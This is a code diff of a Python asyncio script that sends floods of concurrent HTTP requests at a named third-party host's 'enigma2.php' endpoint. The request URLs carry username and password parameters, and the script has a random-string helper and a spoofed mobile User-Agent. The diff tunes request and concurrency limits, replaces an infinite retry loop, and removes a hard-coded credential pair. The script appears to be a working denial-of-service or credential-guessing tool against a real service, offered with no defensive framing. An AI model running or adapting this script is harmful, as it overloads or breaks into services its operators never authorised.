@@ -3,9 +3,26 @@ import asyncio
 from aiohttp import ClientSession
 import random
 import string
+import traceback
 
-MAXREQ = 1000000
-MAXTHREAD = 5000
+
+MAXREQ = 10000
+MAXTHREAD = 1000
+
+# headers={ "Host": "****************",
+#             "User-Agent": 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
+#             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+#             "Accept-Language": "en-US,en;q=0.5",
+#             "Accept-Encoding": "gzip, deflate, br",
+#             "Referer": "https://www.google.com",
+#             "Connection": "keep-alive",
+#             "Upgrade-Insecure-Requests": "1",
+#             "Cache-Control": "max-age=0",
+#             }
+
+headers={
+     "User-Agent": 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36'
+}
 
 def random_string(length:int=6, charset:str=string.ascii_letters+string.digits):
     return ''.join([random.choice(charset) for i in range(length)])
@@ -13,14 +30,14 @@ def random_string(length:int=6, charset:str=string.ascii_letters+string.digits):
 
 async def fetch(url, session):
     try:
-        async with session.get(url) as response:
+        async with session.head(url,headers=headers) as response:
             delay = response.headers.get("DELAY")
             date = response.headers.get("DATE")
-            #print("{}:{} with delay {}".format(date, response.url, delay))
-            #print(response.status)
+            print("{}:{} with delay {}".format(date, response.url, delay))
+            print(response.status)
             return await response.read()
     except:
-        pass
+        traceback.print_exc()
 
 
 async def bound_fetch( url, session):
@@ -32,8 +49,8 @@ async def bound_fetch( url, session):
 
 async def run(r):
     url = "http://venex.rocks/enigma2.php?username={}&password={}&type=get_vod_categories"
-    url="http://venex.rocks/enigma2.php?username=XJAJ1pXgQx&password=r3PKoC2XkZ&type=get_live_categories&{}={}"
     tasks = []
+
 
     # Create client session that will ensure we dont open new connection
     # per each request.
@@ -47,12 +64,10 @@ async def run(r):
         await responses
 
 
-while True:
-    try:
-        number = MAXREQ
-        loop = asyncio.get_event_loop()
 
-        future = asyncio.ensure_future(run(number))
-        loop.run_until_complete(future)
-    except:
-        pass
+number = MAXREQ
+loop = asyncio.get_event_loop()
+
+future = asyncio.ensure_future(run(number))
+loop.run_until_complete(future)
+
